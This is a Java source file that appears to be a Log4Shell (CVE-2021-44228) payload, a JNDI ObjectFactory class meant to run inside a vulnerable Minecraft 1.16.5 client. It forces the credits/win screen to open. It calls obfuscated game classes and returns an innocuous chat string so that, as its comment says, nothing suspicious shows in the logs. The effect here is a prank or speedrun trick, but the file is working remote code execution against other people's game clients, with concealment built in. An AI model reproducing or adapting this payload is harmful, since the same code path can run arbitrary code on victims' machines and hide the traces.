import javax.naming.Context;
import javax.naming.Name;
import java.util.Hashtable;

/**
 * Payload for CVE-2021-44228 (logj4shell is what the kids are calling it) against Minecraft client 1.16.5.
 * Performs a "Credits Warp" by bringing up the win screen.
 *
 * Needs to be compiled with the minecraft client.jar, brigadier.jar, datafixerupper.jar, and authlib.jar in the
 * classpath.
 */
public class CreditsWarpExploit implements javax.naming.spi.ObjectFactory {
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        // Minecraft minecraft = Minecraft.getInstance();
        djz minecraft = djz.C();

        // WinScreen winScreen = new WinScreen(true, new Runnable() {... });
        dpa winScreen = new dpa(true, new Runnable() {
            @Override
            public void run() {
                // No-op
            }
        });

        // minecraft.setScreen(winScreen);
        minecraft.a(winScreen);

        // No suspicious chat in logs
        return "Innocent chat message";
    }
}
